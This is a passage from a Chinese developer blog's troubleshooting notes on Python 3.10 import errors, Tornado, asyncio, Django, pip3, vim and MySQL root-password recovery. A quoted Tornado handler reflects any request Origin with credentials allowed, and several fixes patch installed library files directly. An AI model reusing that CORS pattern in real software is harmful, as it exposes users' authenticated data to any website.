install &quot;werkzeug==1.0.1&quot;</span><br></pre></td></tr></table></figure>\n\n<p>或者</p>\n<p>不使用<code>Flask-Script</code>，使用<code>flask</code>命令如下：</p>\n<p>初始化数据库：<code>flask db init</code></p>\n<p>迁移新更改：<code>flask db migrate</code></p>\n<p>升级：<code>flask db upgrade</code></p>\n<p>还有其它命令…</p>\n<p>或者</p>\n<p><strong>不降级则可以尝试修改一下<code>flask_script/__init__.py</code>中<code>from ._compat import text_type</code> 改成 <code>from flask_script._compat import text_type</code> 。</strong></p>\n<h1 id=\"【已解决】Python-3-10-使用pdf2docx报错ImportError-cannot-import-name-‘Iterable‘-from-‘collections‘的解决办法\"><a href=\"#【已解决】Python-3-10-使用pdf2docx报错ImportError-cannot-import-name-‘Iterable‘-from-‘collections‘的解决办法\" class=\"headerlink\" title=\"【已解决】Python 3.10 使用pdf2docx报错ImportError:cannot import name ‘Iterable‘ from ‘collections‘的解决办法\"></a>【已解决】Python 3.10 使用pdf2docx报错ImportError:cannot import name ‘Iterable‘ from ‘collections‘的解决办法</h1><p>本人初学Python，经推荐看到一个很简单快捷的pdf转docx方法，仅仅需要几行代码即可完成，于是想抄来用，但是因为我安装的Python是3.10.0版，运行的时候老是报错：ImportError:cannot import name ‘Iterable’ from ‘collections’，在“老表Max”的指导下，解决了此问题，感谢！</p>\n<p>pdf2docx代码介绍：</p>\n<p>Convert PDF — pdf2docx 0.5.2 documentation</p>\n<p>运行报错状态：</p>\n<p><img src=\"https://img-blog.csdnimg.cn/24e14282389344a5ba64e93b786faf7d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARGFuaWVsX1hpZV84NA==,size_20,color_FFFFFF,t_70,g_se,x_16\" alt=\"img\"></p>\n<p>原因查找：</p>\n<p>经网上搜索，感谢几位网友的经验，应该是版本导致的问题</p>\n<p><img src=\"https://img-blog.csdnimg.cn/453a8745f36b44a4aaec6faae1033d3b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARGFuaWVsX1hpZV84NA==,size_20,color_FFFFFF,t_70,g_se,x_16\" alt=\"img\"></p>\n<p>解决方法：</p>\n<p>我尝试直接在代码前面加上‘from collections.abc import Iterable’, 测试结果是True,但是还是不能运行。经‘老表Max’指点，看最后一次报错的文件，去改那个文件的代码，然后保存即可 </p>\n<p><img src=\"https://img-blog.csdnimg.cn/09054a3da7b14c35af8756b04954cb5e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARGFuaWVsX1hpZV84NA==,size_20,color_FFFFFF,t_70,g_se,x_16\" alt=\"img\"></p>\n<p><img src=\"https://img-blog.csdnimg.cn/a0726661a71b48fca3ff574f394655ed.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARGFuaWVsX1hpZV84NA==,size_20,color_FFFFFF,t_70,g_se,x_16\" alt=\"img\"></p>\n<p>运行成功界面：</p>\n<p><img src=\"https://img-blog.csdnimg.cn/db8a76d9d91340ca9607cfcfc6e24763.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARGFuaWVsX1hpZV84NA==,size_20,color_FFFFFF,t_70,g_se,x_16\" alt=\"img\"></p>\n<h1 id=\"cannot-import-name-‘Mapping‘-from-‘collections‘\"><a href=\"#cannot-import-name-‘Mapping‘-from-‘collections‘\" class=\"headerlink\" title=\"cannot import name ‘Mapping‘ from ‘collections‘\"></a>cannot import name ‘Mapping‘ from ‘collections‘</h1><p>解决步骤：</p>\n<p>①复制该地址<code>“C:\\User\\…\\AppData\\Local\\Programs\\Python\\Python310\\lib\\collections_init_.py”</code><br>②打开这个地址<br>③加上这条语句：<code>from collections.abc import Mapping</code></p>\n<p><img src=\"https://img-blog.csdnimg.cn/db0e6deff567453cb7f4dab12fb7511a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQXNkenhjeXVpaGprcXdl,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>保存，再输一遍，搞掂</p>\n<p><img src=\"https://img-blog.csdnimg.cn/11cae4aca04f4468b62c872f60c2a756.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>————————————————<br>原文链接：<a href=\"https://blog.csdn.net/weixin_51092297/article/details/122889327\">https://blog.csdn.net/weixin_51092297/article/details/122889327</a></p>\n<h1 id=\"AttributeError-module-‘collections‘-has-no-attribute-‘MutableMapping‘\"><a href=\"#AttributeError-module-‘collections‘-has-no-attribute-‘MutableMapping‘\" class=\"headerlink\" title=\"AttributeError: module ‘collections‘ has no attribute ‘MutableMapping‘\"></a>AttributeError: module ‘collections‘ has no attribute ‘MutableMapping‘</h1><p>情况说明<br>今天在装live server时遇到如下两个问题。</p>\n<p>module ‘collections’ has no attribute ‘MutableSet’<br>AttributeError: module ‘collections’ has no attribute ‘MutableMapping’<br>部分错误结果如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">(py3_django4-<span class=\"number\">0</span>-<span class=\"number\">4</span>) lds@lishuaige:~/Desktop/meiduo/front_end$ live-server </span><br><span class=\"line\">Traceback (most recent call last):</span><br><span class=\"line\">  File <span class=\"string\">&quot;/home/lds/.local/bin/live-server&quot;</span>, line <span class=\"number\">5</span>, <span class=\"keyword\">in</span> &lt;module&gt;</span><br><span class=\"line\">    <span class=\"keyword\">from</span> live_server.cli <span class=\"keyword\">import</span> cli</span><br><span class=\"line\">  File <span class=\"string\">&quot;/home/lds/.local/lib/python3.10/site-packages/live_server/cli.py&quot;</span>, line <span class=\"number\">4</span>, <span class=\"keyword\">in</span> &lt;module&gt;</span><br><span class=\"line\">    <span class=\"keyword\">from</span> . <span class=\"keyword\">import</span> watcher</span><br><span class=\"line\">  File <span class=\"string\">&quot;/home/lds/.local/lib/python3.10/site-packages/live_server/watcher.py&quot;</span>, line <span class=\"number\">7</span>, <span class=\"keyword\">in</span> &lt;module&gt;</span><br><span class=\"line\">    <span class=\"keyword\">from</span> . <span class=\"keyword\">import</span> server</span><br><span class=\"line\">  File <span class=\"string\">&quot;/home/lds/.local/lib/python3.10/site-packages/live_server/server.py&quot;</span>, line <span class=\"number\">5</span>, <span class=\"keyword\">in</span> &lt;module&gt;</span><br><span class=\"line\">    <span class=\"keyword\">import</span> tornado.web</span><br><span class=\"line\">  File <span class=\"string\">&quot;/home/lds/.local/lib/python3.10/site-packages/tornado/web.py&quot;</span>, line <span class=\"number\">88</span>, <span class=\"keyword\">in</span> &lt;module&gt;</span><br><span class=\"line\">    <span class=\"keyword\">from</span> tornado <span class=\"keyword\">import</span> httputil</span><br><span class=\"line\">  File <span class=\"string\">&quot;/home/lds/.local/lib/python3.10/site-packages/tornado/httputil.py&quot;</span>, line <span class=\"number\">107</span>, <span class=\"keyword\">in</span> &lt;module&gt;</span><br><span class=\"line\">    <span class=\"keyword\">class</span> <span class=\"title class_\">HTTPHeaders</span>(collections.MutableMapping):</span><br><span class=\"line\">AttributeError: module <span class=\"string\">&#x27;collections&#x27;</span> has no attribute <span class=\"string\">&#x27;MutableMapping&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>解决方案<br>网上找了好多都是把问题贴出来然后就没下文了，琢磨了三四个小时幸亏解决了！！应该是python 3.10 那些 MutableMapping，MutableSet等放的位置变了，他们的上级模块原本直属collections的变成了abc，也就是说，需要把</p>\n<p><code>collections.MutableMapping</code><br>改成</p>\n<p><code>collections.abc.MutableMapping</code><br>那要怎么改呢？比如我这里报错，就点进源文件里面</p>\n<p><img src=\"https://img-blog.csdnimg.cn/06d7782d73f3445f89512dd4718ac967.png\" alt=\"在这里插入图片描述\"></p>\n<p>按上述方法修改即可。</p>\n<p><img src=\"https://img-blog.csdnimg.cn/fc4a64259d1944deb86a3b10fe39336a.png\" alt=\"在这里插入图片描述\"></p>\n<h1 id=\"Content-Type标头未在Tornado中设置\"><a href=\"#Content-Type标头未在Tornado中设置\" class=\"headerlink\" title=\"Content-Type标头未在Tornado中设置\"></a>Content-Type标头未在Tornado中设置</h1><p>我有以下基类：</p>\n<figure class=\"highlight py\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">CorsHandler</span>(tornado.web.RequestHandler):</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">set_default_headers</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(CorsHandler, self).set_default_headers()</span><br><span class=\"line\"></span><br><span class=\"line\">        self.set_header(<span class=\"string\">&#x27;Access-Control-Allow-Origin&#x27;</span>, self.request.headers.get(<span class=\"string\">&#x27;Origin&#x27;</span>, <span class=\"string\">&#x27;*&#x27;</span>))</span><br><span class=\"line\">        self.set_header(<span class=\"string\">&#x27;Access-Control-Allow-Methods&#x27;</span>, <span class=\"string\">&#x27;GET, PUT, POST, DELETE, OPTIONS&#x27;</span>)</span><br><span class=\"line\">        self.set_header(<span class=\"string\">&#x27;Access-Control-Allow-Credentials&#x27;</span>, <span class=\"string\">&#x27;true&#x27;</span>)</span><br><span class=\"line\">        self.set_header(<span class=\"string\">&#x27;Access-Control-Allow-Headers&#x27;</span>, <span class=\"string\">&#x27;,&#x27;</span>.join(</span><br><span class=\"line\">            self.request.headers.get(<span class=\"string\">&#x27;Access-Control-Request-Headers&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>).split(<span class=\"string\">&#x27;,&#x27;</span>) +</span><br><span class=\"line\">            [<span class=\"string\">&#x27;Content-Type&#x27;</span>]</span><br><span class=\"line\">        ))</span><br><span class=\"line\"></span><br><span class=\"line\">        self.set_header(<span class=\"string\">&#x27;Content-Type&#x27;</span>, <span class=\"string\">&#x27;application/json&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">options</span>(<span class=\"params\">self, *args, **kwargs</span>):</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br></pre></td></tr></table></figure>\n\n<p>和以下处理程序：</p>\n<figure class=\"highlight py\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get</span>(<span class=\"params\">self, resource_id=<span class=\"literal\">None</span>, field=<span class=\"literal\">None</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> resource_id <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">            response = self.resource.query.filter_by(is_deleted=<span class=\"literal\">False</span>).<span class=\"built_in\">all</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            record = self.resource.query.get(<span class=\"built_in\">int</span>(resource_id))</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> field <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">                response = record</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                response = &#123;field: <span class=\"built_in\">getattr</span>(record, field)&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        self.db.session.commit()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception, e:</span><br><span class=\"line\">        self.db.session.rollback()</span><br><span class=\"line\"></span><br><span class=\"line\">        self.send_error(<span class=\"number\">500</span>, message=e.message)</span><br><span class=\"line\"></span><br><span class=\"line\">    self.write(response)</span><br></pre></td></tr></table></figure>\n\n<p>除了未设置Content-Type之外，其他所有内容都非常简单明了。请注意，其他任何标题均已正确设置。</p>\n<p><strong>解决方案</strong></p>\n<p>看来这是<code>304 Not Modified</code>回应。请记住，只有第一个<code>200 OK</code>响应包含<code>Content-Type</code>标头。如果您请求相同的资源，则以下响应将忽略此标头。</p>\n<p>并且要注意，您实际上并不需要显式设置<code>Content-Type</code>。如果您查看Tornado的源代码，您将在以下注释中找到它<code>write(self, chunk)</code>：</p>\n<blockquote>\n<p>如果给定的块是字典，则将其编写为JSON并将响应的Content-Type设置为<code>application/json</code>。（如果您想以不同的方式发送JSON <code>Content-Type</code>，请<em>在</em>调用write（）<em>之后</em>调用set_header ）。</p>\n</blockquote>\n<h1 id=\"python报-DeprecationWarning-“-coroutine”-decorator-…-use-“async-def”-解决办法\"><a href=\"#python报-DeprecationWarning-“-coroutine”-decorator-…-use-“async-def”-解决办法\" class=\"headerlink\" title=\"python报 DeprecationWarning: “@coroutine” decorator …. use “async def” 解决办法\"></a>python报 DeprecationWarning: “@coroutine” decorator …. use “async def” 解决办法</h1><p>python报错：<br>DeprecationWarning: “@coroutine” decorator is deprecated since Python 3.8, use “async def” instea def logger_factory(app, handler):</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20191224115944580.png\" alt=\"在这里插入图片描述\"></p>\n<p>报错原因：<br>用asyncio提供的@asyncio.coroutine可以把一个generator标记为coroutine类型，然后在coroutine内部用yield from调用另一个coroutine实现异步操作。<br>但是从Python 3.5开始引入了新的语法async和await，可以让coroutine的代码更简洁易读（抛弃了@asyncio.coroutine）。</p>\n<p>解决办法：<br>async和await是针对coroutine的新语法，要使用新的语法，只需要做两步简单的替换：</p>\n<p>1.把@asyncio.coroutine替换为async；<br>2.把yield from替换为await。<br>小结<br>Python从3.5版本开始为asyncio提供了async和await的新语法；<br>注意新语法只能用在Python 3.5以及后续版本，如果使用3.4版本，则仍需使用@asyncio.coroutine。</p>\n<h1 id=\"DeprecationWarning-There-is-no-current-event-loop\"><a href=\"#DeprecationWarning-There-is-no-current-event-loop\" class=\"headerlink\" title=\"DeprecationWarning: There is no current event loop\"></a>DeprecationWarning: There is no current event loop</h1><p>我目前所发现的报错原因有以下两种：</p>\n<ol>\n<li><code>loop=asyncio.get_event_loop()</code><br>改为</li>\n</ol>\n<p>​    <code>loop = asyncio.new_event_loop() ​    asyncio.set_event_loop(loop)</code></p>\n<ol start=\"2\">\n<li>由于使用 asyncio.ensure_future() ,需要传入参数以外还需要传入指定loop，如下所示：</li>\n</ol>\n<p><code>task = asyncio.ensure_future(c, loop=loop)</code><br>由于python代码的缩进问题十分严谨，所以new_event_loop以及set_event_loop必须放在ensure_future上面</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 正确用法</span></span><br><span class=\"line\"></span><br><span class=\"line\">loop = asyncio.new_event_loop()</span><br><span class=\"line\">asyncio.set_event_loop(loop)</span><br><span class=\"line\">...</span><br><span class=\"line\">task = asyncio.ensure_future(c, loop=loop)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># c是你自己创建的协程对象，我这里忽略了</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 错误用法</span></span><br><span class=\"line\"></span><br><span class=\"line\">task = asyncio.ensure_future(c, loop=loop)</span><br><span class=\"line\">...</span><br><span class=\"line\">loop = asyncio.new_event_loop()</span><br><span class=\"line\">asyncio.set_event_loop(loop)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"使用Django管理员在后台添加数据库时出现no-such-table-main-auth-user-old解决方法\"><a href=\"#使用Django管理员在后台添加数据库时出现no-such-table-main-auth-user-old解决方法\" class=\"headerlink\" title=\"使用Django管理员在后台添加数据库时出现no such table: main.auth_user__old解决方法\"></a>使用Django管理员在后台添加数据库时出现no such table: main.auth_user__old解决方法</h1><p><img src=\"https://img-blog.csdnimg.cn/20c93d2929ec4a1b8e52a3d6baa4a38d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATmFyY2lzc3VzYOWwj-aarg==,size_20,color_FFFFFF,t_70,g_se,x_16\" alt=\"在这里插入图片描述\"></p>\n<p>在学习Django开发时，创建好管理员账号后，准备通过Django内置的管理网页来测试能否在表中添加记录，选择save后出现如上图所示的报错。</p>\n<p>解决方案是升级Django的版本，原Django version==2.0<br>在命令行中输入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">pip install Django --upgrade</span><br></pre></td></tr></table></figure>\n\n<p>删除掉app下的migrations文件夹，删除掉db.sqlite3</p>\n<p>然后开始对默认的app进行迁移</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">python manage.py migrate</span><br></pre></td></tr></table></figure>\n\n<p>执行完这条命令就可以看到db.sqlite新建好了</p>\n<p>然后迁移自己的app</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">python manage.py makemigrations common</span><br><span class=\"line\">python manage.py migrate common</span><br></pre></td></tr></table></figure>\n\n<p>完成数据库迁移之后，再次创建超级用户</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">python manage.py createsuperuser</span><br></pre></td></tr></table></figure>\n\n<p>可以在新的auth_user表中查看到自己新建的超级用户</p>\n<p><img src=\"https://img-blog.csdnimg.cn/2e83a4ea95e44d30ba8f7dad5f2ce343.png\" alt=\"在这里插入图片描述\"></p>\n<p>保证服务器的运行，进入<a href=\"http://127.0.0.1/admin/\">http://127.0.0.1/admin/</a><br>再次新建用户，此时就可以正常的创建了，问题解决！</p>\n<p><img src=\"https://img-blog.csdnimg.cn/31924b5683e64ef3bc5efcb4fce45e6c.png\" alt=\"在这里插入图片描述\"></p>\n<h1 id=\"TemplateDoesNotExist-at\"><a href=\"#TemplateDoesNotExist-at\" class=\"headerlink\" title=\"TemplateDoesNotExist at/****\"></a>TemplateDoesNotExist at/****</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">TemplateDoesNotExist at /user/find</span><br><span class=\"line\">fruit/list.html</span><br><span class=\"line\">Request Method:\tGET</span><br><span class=\"line\">Request URL:\thttp://localhost:8000/user/find?price1=5</span><br><span class=\"line\">Django Version:\t4.0.6</span><br><span class=\"line\">Exception Type:\tTemplateDoesNotExist</span><br><span class=\"line\">Exception Value:\t</span><br><span class=\"line\">fruit/list.html</span><br><span class=\"line\">Exception Location:\tI:\\CDriveSW\\desktop\\python\\python-web2\\hiDjango\\venv\\lib\\site-packages\\django\\template\\loader.py, line 19, in get_template</span><br><span class=\"line\">Python Executable:\tI:\\CDriveSW\\desktop\\python\\python-web2\\hiDjango\\venv\\Scripts\\python.exe</span><br><span class=\"line\">Python Version:\t3.10.4</span><br><span class=\"line\">Python Path:\t</span><br><span class=\"line\">[&#x27;I:\\\\CDriveSW\\\\desktop\\\\python\\\\python-web2\\\\hiDjango\\\\helloDjango&#x27;,</span><br><span class=\"line\"> &#x27;C:\\\\Users\\\\Private\\\\AppData\\\\Local\\\\Programs\\\\Python\\\\Python310\\\\python310.zip&#x27;,</span><br><span class=\"line\"> &#x27;C:\\\\Users\\\\Private\\\\AppData\\\\Local\\\\Programs\\\\Python\\\\Python310\\\\DLLs&#x27;,</span><br><span class=\"line\"> &#x27;C:\\\\Users\\\\Private\\\\AppData\\\\Local\\\\Programs\\\\Python\\\\Python310\\\\lib&#x27;,</span><br><span class=\"line\"> &#x27;C:\\\\Users\\\\Private\\\\AppData\\\\Local\\\\Programs\\\\Python\\\\Python310&#x27;,</span><br><span class=\"line\"> &#x27;I:\\\\CDriveSW\\\\desktop\\\\python\\\\python-web2\\\\hiDjango\\\\venv&#x27;,</span><br><span class=\"line\"> &#x27;I:\\\\CDriveSW\\\\desktop\\\\python\\\\python-web2\\\\hiDjango\\\\venv\\\\lib\\\\site-packages&#x27;]</span><br><span class=\"line\">Server time:\tSat, 16 Jul 2022 14:11:19 +0800</span><br></pre></td></tr></table></figure>\n\n<p>出错原因：访问不到templates里面的模板<br><strong>解决方式</strong></p>\n<ul>\n<li><p>方法1、 复制hello.html文件至安装路径下的Python27\\lib\\site-packages\\django-1.8.18-py2.7.egg文件下<br>启动服务python manage.py runserver 127.0.0.1:8000<br>运行<a href=\"http://127.0.0.1:8000/hello%EF%BC%8C%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3%E3%80%82\">http://127.0.0.1:8000/hello，错误解决。</a></p>\n</li>\n<li><p>方法2、文件夹templates复制到project项目文件夹下。</p>\n</li>\n<li><p>方法3、在settings.py里确认TEMPLATES目录</p>\n<p>```python<br>BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(<strong>file</strong>)))  # 项目内路径<br>…<br>…<br>…<br>TEMPLATES = [</p>\n<pre><code>&#123;\n    &#39;BACKEND&#39;: &#39;django.template.backends.django.DjangoTemplates&#39;,\n    &#39;DIRS&#39;: [\n        os.path.join(BASE_DIR, &#39;../templates&#39;),  # 后面参数表示模板主目录相对内路径的所在位置\n    ],\n    &#39;APP_DIRS&#39;: True,\n    &#39;OPTIONS&#39;: &#123;\n        &#39;context_processors&#39;: [\n            &#39;django.template.context_processors.debug&#39;,\n            &#39;django.template.context_processors.request&#39;,\n            &#39;django.contrib.auth.context_processors.auth&#39;,\n            &#39;django.contrib.messages.context_processors.messages&#39;,\n        ],\n    &#125;,\n&#125;,\n</code></pre>\n<p>]</p>\n</li>\n</ul>\n<h1 id=\"Ubuntu-系统下如何安装pip3工具\"><a href=\"#Ubuntu-系统下如何安装pip3工具\" class=\"headerlink\" title=\"Ubuntu 系统下如何安装pip3工具\"></a>Ubuntu 系统下如何安装pip3工具</h1><p>一、【导读】<br>Ubuntu 系统内置了 Python2 和 Python3 两个版本的开发环境，却没有内置相应的 pip3 管理工具，本文将介绍如何在Ubuntu下如何快速安装 pip3 工具，并升级到最新可用版本（教程同样适用于Linux下安装）。</p>\n<p>二、安装<br>直接在 Ubuntu 终端下输入“pip3 -V”命令尝试查看对应 pip3 工具的版本信息：</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190419093412955.png\" alt=\"img\"></p>\n<p>提示没有相关的pip工具，但可以尝试使用 “sudo apt install python3-pip” 命令进行安装，所以只需在终端输入：</p>\n<p><code>sudo apt-get install python3-pip</code><br>回车即可安装，但安装的 pip3 工具并不是最新版本的：</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190419095622525.png\" alt=\"img\"></p>\n<p>接下来需要进行pip工具的升级更新。</p>\n<p>三、升级<br>运行更新升级指令：</p>\n<p><code>sudo pip3 install --upgrade pip</code><br>升级成功后：</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190419105203265.png\" alt=\"img\"></p>\n<p>四、卸载<br><code>sudo apt-get remove python3-pip</code></p>\n","categories":["troubleshooting"],"tags":["问题排除记录"]},{"title":"疑难解答-Linux","url":"/2022/08/17/%E7%96%91%E9%9A%BE%E8%A7%A3%E7%AD%94-linux/","content":"<h1 id=\"vim不能复制粘贴\"><a href=\"#vim不能复制粘贴\" class=\"headerlink\" title=\"vim不能复制粘贴\"></a>vim不能复制粘贴</h1><p>远程登录上liunx服务器上，使用vim打开文本，遇到windows内容不能粘贴到文本里，文本内容不能粘贴到windows上的问题。</p>\n<p>解决方法：</p>\n<p>Esc退出插入模式,输入</p>\n<p>set mouse=v<br>即可，但是只是临时有效，下次进入还的从新设置。</p>\n<p>可以将设置写入vim配置文件中</p>\n<p>配置文件是家目录下.vimc文件，然后source .vimc使配置生效</p>\n<h1 id=\"Linux下mysql-5-6重置root密码-https-www-cnblogs-com-xzlive-p-12758788-html\"><a href=\"#Linux下mysql-5-6重置root密码-https-www-cnblogs-com-xzlive-p-12758788-html\" class=\"headerlink\" title=\"Linux下mysql-5.6重置root密码](https://www.cnblogs.com/xzlive/p/12758788.html)\"></a>Linux下mysql-5.6重置root密码](<a href=\"https://www.cnblogs.com/xzlive/p/12758788.html\">https://www.cnblogs.com/xzlive/p/12758788.html</a>)</h1><p><strong>1. 检查<code>mysql</code>服务是否启动，如果启动，关闭<code>mysql</code>服务</strong></p>\n<p>运行命令：<code>ps -ef | grep -i mysql</code></p>\n<p><img src=\"https://img2018.cnblogs.com/blog/1411470/201909/1411470-20190929173649786-1102739601.png\" alt=\"img\"></p>\n<p> 如果开着就运行关闭的命令：service mysqld stop</p>\n<p><img src=\"https://img2018.cnblogs.com/blog/1411470/201909/1411470-20190929173858703-2071558955.png\" alt=\"img\"></p>\n<p> <strong>2.修改mysql的配置文件my.conf</strong></p>\n<p>一般在/etc目录下，运行命令：vi /etc/my.cnf，编辑文件</p>\n<p><img src=\"https://img2018.cnblogs.com/blog/1411470/201909/1411470-20190930100829664-491241917.png\" alt=\"img\"></p>\n<p>在文件的<code>[mysqld]标签下添加一句：skip-grant-tables</code></p>\n<p><img src=\"https://img2018.cnblogs.com/blog/1411470/201909/1411470-20190930161834995-303636370.png\" alt=\"img\"></p>\n<p>然后wq!保存退出。</p>\n<p> <strong>3.重启数据库</strong></p>\n<figure class=\"highlight dos\"><table><tr><td class=\"code\"><pre><span class=\"line\">运行命令：service mysqld <span class=\"built_in\">start</span></span><br></pre></td></tr></table></figure>\n\n<p> <strong>4.重启数据库</strong></p>\n<figure class=\"highlight dos\"><table><tr><td class=\"code\"><pre><span class=\"line\">运行命令：service mysqld <span class=\"built_in\">start</span></span><br></pre></td></tr></table></figure>\n\n<p> <strong>5.进入到mysql数据库</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"> 运行命令：</span><br><span class=\"line\">mysql -u root </span><br><span class=\"line\">mysql -u root </span><br></pre></td></tr></table></figure>\n\n<p> <strong>6.进入到mysql数据库</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"> 运行命令：</span><br><span class=\"line\">mysql -u root </span><br><span class=\"line\">mysql -u root </span><br></pre></td></tr></table></figure>\n\n<p> <strong>7.修改密码</strong></p>\n<p>　<code>以下是5.6的方式</code></p>\n<p>　　运行语句：use mysql;<br>　　继续运行语句：update mysql.user set password=password(‘root_password’) where user=’root’;<br>　　root_password替换成你想要的密码</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">以下是<span class=\"number\">5.7</span>的方式</span><br><span class=\"line\">　　运行语句：</span><br><span class=\"line\">use mysql;</span><br><span class=\"line\">　　继续运行语句：</span><br><span class=\"line\"><span class=\"keyword\">update</span> mysql.user <span class=\"keyword\">set</span> authentication_string<span class=\"operator\">=</span>password(<span class=\"string\">&#x27;root_password&#x27;</span>) <span class=\"keyword\">where</span> <span class=\"keyword\">user</span><span class=\"operator\">=</span><span class=\"string\">&#x27;root&#x27;</span>;    </span><br><span class=\"line\">　　root_password</span><br><span class=\"line\">替换成你想要的密码</span><br><span class=\"line\">use mysql;</span><br><span class=\"line\"><span class=\"keyword\">update</span> mysql.user <span class=\"keyword\">set</span> authentication_string<span class=\"operator\">=</span>password(<span class=\"string\">&#x27;root_password&#x27;</span>) <span class=\"keyword\">where</span> <span class=\"keyword\">user</span><span class=\"operator\">=</span><span class=\"string\">&#x27;root&#x27;</span>;    </span><br><span class=\"line\">　　root_password</span><br><span class=\"line\">　　root_password</span><br><span class=\"line\"> </span><br></pre></td></tr></table></figure>\n\n<p>  <strong>8.把步骤2加的东西删除掉，在重启服务器，就可以使用刚才修改的密码登录进服务器了。</strong></p>\n<p> <code>mysql -u root -p</code></p>\n<p>到这一步已经全部结束。</p>\n<h1 id=\"windows下用navicat链接虚拟机MySQL数据库的过程和问题解决\"><a href=\"#windows下用navicat链接虚拟机MySQL数据库的过程和问题解决\" class=\"headerlink\" title=\"windows下用navicat链接虚拟机MySQL数据库的过程和问题解决\"></a><a href=\"https://www.cnblogs.com/brankoliu/p/10845491.html\">windows下用navicat链接虚拟机MySQL数据库的过程和问题解决</a></h1><p>navicat远程连接虚拟机中的MySQL数据库</p>\n<p>1、在linux查看mysql服务器IP地址</p>\n<p>  ifconfig</p>\n<p><img src=\"https://img2018.cnblogs.com/blog/1684288/201905/1684288-20190510171136471-741902129.png\" alt=\"img\"></p>\n<p>记住此IP</p>\n<p>navicat设置</p>\n<p><img src=\"https://img2018.cnblogs.com/blog/1684288/201905/1684288-20190510170947706-321808436.png\" alt=\"img\"></p>\n<p> 设置完毕</p>\n<p><strong>遇到问题</strong></p>\n<p>一直连不上，在网上搜索了一下，主要原因为两种</p>\n<p><strong>1 虚拟机防火墙或者 3306端口未启用</strong></p>\n<p><strong>2 mysql授权问题</strong></p>\n<p><strong>问题1</strong> </p>\n<p>连接时错误提示</p>\n<p>使用图形界面管理工具Navicat for MySQL连接Mysql数据库时提示错误：Can’t connect to MySQL server (10060)</p>\n<p><img src=\"https://img2018.cnblogs.com/blog/1684288/201905/1684288-20190510170520040-394183993.png\" alt=\"img\"></p>\n<p> 问题原因：</p>\n<p>导致些问题可能有以下几个原因：</p>\n<p>1、网络不通；</p>\n<p>2、服务未启动；</p>\n<p>3、防火墙端口未开放；</p>\n<p>解决方法：</p>\n<p>启动服务：</p>\n<p>　　首先，我用navicat去远程链接我虚拟机中的MySQL，链接测试失败。</p>\n<p>　　然后在虚拟机中查看网络端口信息：</p>\n<p>　　#netstat -ntpl</p>\n<p><img src=\"https://img2018.cnblogs.com/blog/1684288/201905/1684288-20190510164458189-927374514.png\" alt=\"img\"></p>\n<p>iptables -vnL</p>\n<p> 查看防火墙的状态，查看3306端口，</p>\n<p> 如果3306如下，是drop状态，或者根本无3306端口，说明3306端口设置问题</p>\n<p><img src=\"https://img2018.cnblogs.com/blog/1684288/201905/1684288-20190510165456615-1565300417.png\" alt=\"img\"></p>\n<p><strong>解决办法：</strong></p>\n<p>启动服务：</p>\n<p><code>service mysqld start;</code></p>\n<p>开放防火墙端口<br>添加需要监听的端口<br>/sbin/iptables -I INPUT -p tcp –dport 3306 -j 